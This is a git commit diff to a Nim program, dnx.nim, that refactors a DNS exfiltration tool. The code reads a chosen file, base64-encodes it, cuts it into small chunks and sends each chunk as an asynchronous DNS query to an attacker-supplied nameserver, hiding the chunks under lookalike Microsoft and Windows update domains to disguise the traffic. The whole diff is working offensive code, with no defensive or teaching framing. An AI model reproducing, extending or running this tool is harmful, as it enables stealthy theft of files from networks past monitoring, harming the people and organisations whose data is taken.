1902efed5d3b3d76ec39b360edb8decb49e7bc43
g0ttfrid <yurimaia@protonmail.ch>
2022-11-30 01:48:01 -0300

    Update dnx.nim

--- dnx.nim
+++ dnx.nim
@@ -1,18 +1,20 @@
-import os, ndns, strutils, random
+import std/[os, strutils, random, asyncdispatch]
+import pkg/ndns
 from base64 import encode
 randomize()
 
-#[
-TODO: 
-    confirmar envio
-]#
-
-proc dnsExfiltrate(ns: string, target: string, slp: int): void =
+proc nDns(ns: string, dnsquery: string) {.async.} =
     let
-        content = readFile(target)
-        hex = encode(content, safe=true).replace("=", "")
         header = initHeader(randId(), rd = true)
         client = initDnsClient(ns)
+        question = initQuestion(dnsquery, QType.A, QClass.IN)
+        msg = initMessage(header, @[question])
+        resp = waitFor dnsAsyncQuery(client, msg)
+
+proc dnsExfil(ns: string, target: string, slp: int): void =
+    let
+        content = readFile(target)
+        b64 = encode(content, safe=true).replace("=", "")
         chuckSize = 20 # max 62
         domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
     
@@ -21,25 +23,20 @@ proc dnsExfiltrate(ns: string, target: string, slp: int): void =
     echo "[+] Sending ", target
 
     try:
-        while stringindex <= hex.len-1:
-            let 
-                query =  hex[stringindex .. (if stringindex + chuckSize - 1 > hex.len - 1: hex.len - 1 else: stringindex + chuckSize - 1)]
+        while stringindex <= b64.len-1:
+            let
+                query =  b64[stringindex .. (if stringindex + chuckSize - 1 > b64.len - 1: b64.len - 1 else: stringindex + chuckSize - 1)]
                 dnsquery = query & sample(domains)
-                question = initQuestion(dnsquery, QType.A, QClass.IN)
-                msg = initMessage(header, @[question])
+            
             #echo dnsquery
-            discard(dnsAsyncQuery(client, msg))
-
-            stringindex += chuckSize
+            
+            asyncCheck nDns(ns, dnsquery)
+            inc(stringindex, chuckSize)
             sleep(slp)
-
-        let 
-            question = initQuestion("quit", QType.A, QClass.IN)
-            msg = initMessage(header, @[question])
         
-        discard(dnsAsyncQuery(client, msg))
+        asyncCheck nDns(ns, "quit")
         echo "[+] Done!"
-    
+        
     except CatchableError as e:
         echo "[!] Error: ", e.msg
 
@@ -49,4 +46,4 @@ when isMainModule:
         echo "[!] e.g: dnx.exe 127.0.0.1 file.pdf 1000"
         quit()
     else:
-        dnsExfiltrate(paramStr(1), paramStr(2), parseInt(paramStr(3)))
+        dnsExfil(paramStr(1), paramStr(2), parseInt(paramStr(3)))
